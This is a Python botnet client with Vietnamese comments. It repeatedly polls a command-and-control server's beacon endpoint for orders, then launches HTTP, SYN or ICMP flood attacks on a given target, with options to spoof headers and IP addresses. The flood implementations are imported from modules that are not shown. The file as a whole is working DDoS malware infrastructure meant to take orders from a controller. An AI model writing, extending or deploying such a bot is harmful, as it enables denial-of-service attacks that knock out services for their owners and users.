import os
import aiohttp
import asyncio
import time
from attacks.http_flood import HTTPFlood
from attacks.syn_flood import SYNFlood
from attacks.icmp_flood import ICMPFlood

# Cấu hình
BOT_ID = os.getenv("BOT_ID", "bot1")
C2_URL = os.getenv("C2_URL", "http://c2:8000")
POLLING_INTERVAL = int(os.getenv("POLLING_INTERVAL", 5))

# Định nghĩa các loại tấn công
ATTACK_TYPES = {
    "HTTP_FLOOD": HTTPFlood,
    "SYN_FLOOD": SYNFlood,
    "ICMP_FLOOD": ICMPFlood
}

async def handle_command(command_data):
    """Xử lý lệnh tấn công từ JSON command."""
    required_fields = ["attack_type", "intensity", "duration", "target_url"]
    for field in required_fields:
        if field not in command_data:
            print(f"Thiếu trường bắt buộc: {field}")
            return

    attack_type = command_data["attack_type"]
    if attack_type not in ATTACK_TYPES:
        print(f"Loại tấn công không biết: {attack_type}")
        return

    # Tạo ID tấn công ngẫu nhiên dựa trên thời gian
    attack_id = f"attack_{int(time.time())}"

    # Tạo đối tượng tấn công
    attack = ATTACK_TYPES[attack_type](
            bot_id=BOT_ID,
            attack_id=attack_id,
            target=command_data["target_url"],
            duration=command_data["duration"],
            intensity=command_data["intensity"],
            spoof_headers=command_data.get("spoof_headers", False),
            custom_headers=command_data.get("custom_headers", {}),
            target_port=command_data.get("target_port", None),
            spoof_ip=command_data.get("spoof_ip", False),
            packet_size=command_data.get("packet_size", None)
        )

    # Thực thi tấn công
    print(f"Bắt đầu tấn công {attack_type} với target: {command_data['target_url']}")
    await attack.execute()

async def main():
    """Vòng lặp chính của bot: nhận lệnh và thực thi."""
    async with aiohttp.ClientSession() as session:
        while True:
            try:
                # Gọi beacon để nhận lệnh
                async with session.get(f"{C2_URL}/ddos-bot/beacon/{BOT_ID}") as response:
                    if response.status == 200:
                        command_data = await response.json()
                        print(f"Nhận lệnh: {command_data}")
                        await handle_command(command_data)
                    elif response.status == 204:
                        print("Không nhận được lệnh")
                    else:
                        print(f"Lỗi beacon: {response.status}")
            except Exception as e:
                print(f"Lỗi trong vòng lặp beacon: {e}")
            await asyncio.sleep(POLLING_INTERVAL)

if __name__ == "__main__":
    asyncio.run(main())